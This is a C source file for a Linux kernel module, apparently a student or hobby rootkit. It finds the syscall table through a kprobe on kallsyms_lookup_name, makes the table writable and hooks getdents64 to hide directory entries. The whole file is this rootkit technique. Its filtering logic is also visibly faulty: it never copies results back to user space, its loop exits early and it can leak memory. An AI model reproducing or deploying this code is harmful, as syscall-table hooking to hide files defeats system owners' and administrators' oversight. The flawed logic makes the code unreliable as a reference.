#include <asm/ptrace.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>

#define MAX_BUFFER_SIZE 65536

MODULE_AUTHOR("Iman Mohammadi & Negar Babashah");
MODULE_LICENSE("GPL");

typedef unsigned long (*lookup_func_t)(const char *name);
typedef asmlinkage long (*original_getdents_t)(struct pt_regs *);

static void **global_syscall_table;
original_getdents_t original_getdents;

void make_page_writable(void *addr) {
    unsigned int lvl;
    pte_t *pte = lookup_address((unsigned long) addr, &lvl);
    if (pte->pte & ~_PAGE_RW) pte->pte |= _PAGE_RW;
}

void restore_page_protection(void *addr) {
    unsigned int lvl;
    pte_t *pte = lookup_address((unsigned long) addr, &lvl);
    if (pte->pte & _PAGE_RW) pte->pte &= ~_PAGE_RW;
}

asmlinkage long modified_getdents(struct pt_regs *regs) {
    struct linux_dirent64 *dirent_buf, *cur_dirent;
    struct inode *inode;
    struct path path;
    int read_bytes = (*original_getdents)(regs);
    dirent_buf = (struct linux_dirent64 *) kmalloc(MAX_BUFFER_SIZE, GFP_KERNEL);
    if (copy_from_user(dirent_buf, (void *) regs->si, MAX_BUFFER_SIZE)) return 0;
    cur_dirent = dirent_buf;
    kern_path("/home/", 0, &path);
    inode = path.dentry->d_inode;
    path_put(&path);
    long home_inode_num = inode->i_ino;

    int offset = 0;
    while (offset < read_bytes) {
        if ((strncmp(cur_dirent->d_name, ".", 1) == 0 || strncmp(cur_dirent->d_name, "..", 2) == 0) &&
            cur_dirent->d_ino != home_inode_num) {
            offset += cur_dirent->d_reclen;
            cur_dirent = (struct linux_dirent64 *) (((char *) dirent_buf) + offset);
            continue;
        }
        kfree((void *) dirent_buf);
        return read_bytes - offset;
    }
    kfree((void *) dirent_buf);
    return read_bytes;
}

static int __init hide_module_init(void) {
    struct kprobe probe;
    lookup_func_t get_symbol;
    printk(KERN_INFO "Module loading.\n");
    memset(&probe, 0, sizeof(struct kprobe));
    probe.symbol_name = "kallsyms_lookup_name";
    if (register_kprobe(&probe) < 0) {
        printk(KERN_INFO "Symbol lookup failed.\n");
        return -1;
    }
    get_symbol = (lookup_func_t) probe.addr;
    unregister_kprobe(&probe);
    global_syscall_table = (void *) get_symbol("sys_call_table");
    if (!global_syscall_table) {
        printk(KERN_INFO "Syscall table not found.\n");
        return -1;
    }
    make_page_writable(global_syscall_table);
    original_getdents = ((original_getdents_t *) global_syscall_table)[__NR_getdents64];
    ((original_getdents_t *) global_syscall_table)[__NR_getdents64] = modified_getdents;
    restore_page_protection(global_syscall_table);
    return 0;
}

static void __exit hide_module_exit(void) {
    printk(KERN_INFO "Module unloading.\n");
    make_page_writable(global_syscall_table);
    ((original_getdents_t *) global_syscall_table)[__NR_getdents64] = original_getdents;
    restore_page_protection(global_syscall_table);
}

module_init(hide_module_init);
module_exit(hide_module_exit);